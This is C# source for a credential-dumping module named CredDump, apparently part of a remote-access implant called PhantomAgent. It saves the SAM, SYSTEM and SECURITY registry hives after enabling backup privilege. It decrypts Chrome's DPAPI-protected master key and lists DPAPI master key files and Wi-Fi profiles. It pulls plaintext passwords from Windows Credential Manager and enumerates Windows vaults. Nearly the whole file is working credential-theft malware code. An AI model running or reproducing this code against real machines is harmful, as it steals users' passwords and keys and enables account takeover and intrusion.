using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

namespace PhantomAgent.Modules;

public static class CredDump
{
    public const string Name = "creds";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["sam_dump"] = _ => DumpSam(),
            ["dpapi_creds"] = _ => DpapiDecrypt(),
            ["cred_enum"] = _ => EnumCredentials(),
            ["vault_enum"] = _ => EnumVaults(),
        };
    }

    private static Dictionary<string, object> DumpSam()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(tempDir);
        string samPath = Path.Combine(tempDir, "sam");
        string systemPath = Path.Combine(tempDir, "system");
        string securityPath = Path.Combine(tempDir, "security");

        try
        {
            // Save SAM, SYSTEM, and SECURITY hives using RegSaveKey
            int samRes = SaveHive(0x80000002, "SAM", samPath);       // HKLM
            int sysRes = SaveHive(0x80000002, "SYSTEM", systemPath);
            int secRes = SaveHive(0x80000002, "SECURITY", securityPath);

            var result = new Dictionary<string, object>
            {
                ["sam_saved"] = samRes == 0,
                ["system_saved"] = sysRes == 0,
                ["security_saved"] = secRes == 0,
                ["sam_path"] = samPath,
                ["system_path"] = systemPath,
                ["security_path"] = securityPath,
            };

            if (samRes == 0 && sysRes == 0)
            {
                // Parse the SAM hive to extract user accounts
                result["users"] = ParseSamUsers();
            }

            return result;
        }
        catch (Exception ex)
        {
            return new Dictionary<string, object> { ["error"] = ex.Message };
        }
    }

    private static int SaveHive(uint hKey, string subKey, string filePath)
    {
        int result = NativeMethods.RegOpenKeyEx((IntPtr)(long)hKey, subKey, 0, 0x20019, out IntPtr phkResult); // KEY_READ
        if (result != 0) return result;

        try
        {
            // Enable SeBackupPrivilege for registry hive dumping
            EnablePrivilege("SeBackupPrivilege");
            return NativeMethods.RegSaveKeyEx(phkResult, filePath, IntPtr.Zero, 2); // REG_LATEST_FORMAT
        }
        finally
        {
            NativeMethods.RegCloseKey(phkResult);
        }
    }

    private static List<Dictionary<string, string>> ParseSamUsers()
    {
        var users = new List<Dictionary<string, string>>();
        try
        {
            using var samKey = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users\Names");
            if (samKey == null) return users;

            foreach (string name in samKey.GetSubKeyNames())
            {
                try
                {
                    using var userKey = samKey.OpenSubKey(name);
                    if (userKey == null) continue;
                    // The default value's type encodes the RID
                    int rid = (int)userKey.GetValueKind("");
                    users.Add(new Dictionary<string, string>
                    {
                        ["username"] = name,
                        ["rid"] = $"0x{rid:X4}",
                    });
                }
                catch { }
            }
        }
        catch { }
        return users;
    }

    private static Dictionary<string, object> DpapiDecrypt()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        var results = new List<Dictionary<string, string>>();

        // Attempt to decrypt Chrome Login Data (DPAPI-protected)
        string chromePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Google\Chrome\User Data\Local State");

        if (File.Exists(chromePath))
        {
            try
            {
                string json = File.ReadAllText(chromePath);
                using var doc = JsonDocument.Parse(json);
                if (doc.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
                    osCrypt.TryGetProperty("encrypted_key", out var encKeyProp))
                {
                    byte[] encKeyFull = Convert.FromBase64String(encKeyProp.GetString()!);
                    // Strip "DPAPI" prefix (first 5 bytes)
                    byte[] encKey = new byte[encKeyFull.Length - 5];
                    Array.Copy(encKeyFull, 5, encKey, 0, encKey.Length);

                    // Decrypt master key via DPAPI
                    if (NativeMethods.CryptUnprotectData(encKey, out byte[]? decrypted) && decrypted != null)
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["source"] = "Chrome Master Key",
                            ["key_hex"] = Convert.ToHexString(decrypted),
                        });
                    }
                }
            }
            catch { }
        }

        // Enumerate DPAPI master key files
        string dpApiPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            @"Microsoft\Protect");
        if (Directory.Exists(dpApiPath))
        {
            try
            {
                foreach (string sidDir in Directory.GetDirectories(dpApiPath))
                {
                    foreach (string mkFile in Directory.GetFiles(sidDir))
                    {
                        string fileName = Path.GetFileName(mkFile);
                        if (Guid.TryParse(fileName, out _))
                        {
                            results.Add(new Dictionary<string, string>
                            {
                                ["source"] = "DPAPI Master Key",
                                ["sid"] = Path.GetFileName(sidDir),
                                ["guid"] = fileName,
                                ["path"] = mkFile,
                            });
                        }
                    }
                }
            }
            catch { }
        }

        // Enumerate saved WiFi profiles via registry
        try
        {
            using var wifiKey = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles");
            if (wifiKey != null)
            {
                foreach (string subKeyName in wifiKey.GetSubKeyNames())
                {
                    using var profile = wifiKey.OpenSubKey(subKeyName);
                    string? profileName = profile?.GetValue("ProfileName") as string;
                    if (!string.IsNullOrEmpty(profileName))
                    {
                        results.Add(new Dictionary<string, string>
                        {
                            ["source"] = "WiFi Profile",
                            ["name"] = profileName,
                        });
                    }
                }
            }
        }
        catch { }

        return new Dictionary<string, object>
        {
            ["dpapi_results"] = results,
            ["count"] = results.Count,
        };
    }

    private static Dictionary<string, object> EnumCredentials()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        var creds = new List<Dictionary<string, string>>();

        // CredEnumerate returns all credentials in the user's credential set
        bool success = NativeMethods.CredEnumerate(null, 0, out int count, out IntPtr pCredentials);
        if (!success || count == 0)
            return new Dictionary<string, object> { ["credentials"] = creds, ["count"] = 0 };

        try
        {
            for (int i = 0; i < count; i++)
            {
                IntPtr credPtr = Marshal.ReadIntPtr(pCredentials, i * IntPtr.Size);
                var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(credPtr);

                var entry = new Dictionary<string, string>
                {
                    ["target"] = cred.TargetName ?? "",
                    ["username"] = cred.UserName ?? "",
                    ["type"] = cred.Type.ToString(),
                    ["persist"] = cred.Persist.ToString(),
                    ["last_written"] = DateTime.FromFileTime(
                        ((long)cred.LastWritten.dwHighDateTime << 32) | (uint)cred.LastWritten.dwLowDateTime)
                        .ToString("yyyy-MM-dd HH:mm:ss"),
                };

                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                {
                    byte[] blob = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, blob, 0, (int)cred.CredentialBlobSize);
                    // Attempt to read as Unicode string (generic credentials store plaintext passwords)
                    try { entry["password"] = Encoding.Unicode.GetString(blob); } catch { }
                }

                creds.Add(entry);
            }
        }
        finally
        {
            NativeMethods.CredFree(pCredentials);
        }

        return new Dictionary<string, object> { ["credentials"] = creds, ["count"] = creds.Count };
    }

    private static Dictionary<string, object> EnumVaults()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        var vaults = new List<Dictionary<string, string>>();

        int result = NativeMethods.VaultEnumerateVaults(0, out int vaultCount, out IntPtr vaultGuids);
        if (result != 0)
            return new Dictionary<string, object> { ["vaults"] = vaults, ["count"] = 0, ["error"] = $"VaultEnumerateVaults: {result}" };

        try
        {
            for (int i = 0; i < vaultCount; i++)
            {
                Guid vaultGuid = Marshal.PtrToStructure<Guid>(vaultGuids + i * 16);

                int openResult = NativeMethods.VaultOpenVault(ref vaultGuid, 0, out IntPtr hVault);
                if (openResult != 0) continue;

                try
                {
                    int enumResult = NativeMethods.VaultEnumerateItems(hVault, 0x0200, out int itemCount, out IntPtr items);
                    if (enumResult != 0) continue;

                    vaults.Add(new Dictionary<string, string>
                    {
                        ["vault_guid"] = vaultGuid.ToString(),
                        ["item_count"] = itemCount.ToString(),
                    });

                    // Items structure varies by Windows version; we report the count
                }
                finally
                {
                    NativeMethods.VaultCloseVault(ref hVault);
                }
            }
        }
        finally
        {
            Marshal.FreeHGlobal(vaultGuids);
        }

        return new Dictionary<string, object> { ["vaults"] = vaults, ["count"] = vaults.Count };
    }

    private static void EnablePrivilege(string privilegeName)
    {
        if (!NativeMethods.OpenProcessToken(
                System.Diagnostics.Process.GetCurrentProcess().Handle,
                0x0020 | 0x0008, out IntPtr hToken)) // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            return;

        try
        {
            NativeMethods.LookupPrivilegeValue(null, privilegeName, out var luid);
            var tp = new NativeMethods.TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Luid = luid,
                Attributes = 0x00000002, // SE_PRIVILEGE_ENABLED
            };
            NativeMethods.AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }
        finally
        {
            NativeMethods.CloseHandle(hToken);
        }
    }

    private static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr hProcess, int access, out IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string? host, string name, out LUID luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr hToken, bool disableAll,
            ref TOKEN_PRIVILEGES newState, int bufferLength, IntPtr previousState, IntPtr returnLength);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern int RegOpenKeyEx(IntPtr hKey, string subKey, int options, int samDesired, out IntPtr phkResult);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern int RegSaveKeyEx(IntPtr hKey, string file, IntPtr securityAttributes, int flags);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(IntPtr hKey);

        // CryptUnprotectData wrapper: decrypts DPAPI blob in current user context
        public static bool CryptUnprotectData(byte[] encData, out byte[]? decData)
        {
            decData = null;
            var dataIn = new DATA_BLOB { cbData = encData.Length };
            dataIn.pbData = Marshal.AllocHGlobal(encData.Length);
            Marshal.Copy(encData, 0, dataIn.pbData, encData.Length);

            try
            {
                if (!CryptUnprotectDataNative(ref dataIn, IntPtr.Zero, IntPtr.Zero,
                        IntPtr.Zero, IntPtr.Zero, 0, out var dataOut))
                    return false;

                try
                {
                    decData = new byte[dataOut.cbData];
                    Marshal.Copy(dataOut.pbData, decData, 0, dataOut.cbData);
                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(dataOut.pbData);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(dataIn.pbData);
            }
        }

        [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", SetLastError = true)]
        private static extern bool CryptUnprotectDataNative(ref DATA_BLOB pDataIn, IntPtr ppszDataDescr,
            IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

        // Credential Manager APIs
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CredEnumerate(string? filter, int flags, out int count, out IntPtr credentials);

        [DllImport("advapi32.dll")]
        public static extern void CredFree(IntPtr buffer);

        // Windows Vault APIs (vaultcli.dll)
        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateVaults(int flags, out int vaultCount, out IntPtr vaultGuids);

        [DllImport("vaultcli.dll")]
        public static extern int VaultOpenVault(ref Guid vaultGuid, int flags, out IntPtr hVault);

        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateItems(IntPtr hVault, int flags, out int itemCount, out IntPtr items);

        [DllImport("vaultcli.dll")]
        public static extern int VaultCloseVault(ref IntPtr hVault);

        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID Luid;
            public int Attributes;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CREDENTIAL
        {
            public int Flags;
            public int Type;
            public string? TargetName;
            public string? Comment;
            public FILETIME LastWritten;
            public uint CredentialBlobSize;
            public IntPtr CredentialBlob;
            public int Persist;
            public int AttributeCount;
            public IntPtr Attributes;
            public string? TargetAlias;
            public string? UserName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FILETIME
        {
            public int dwLowDateTime;
            public int dwHighDateTime;
        }
    }
}
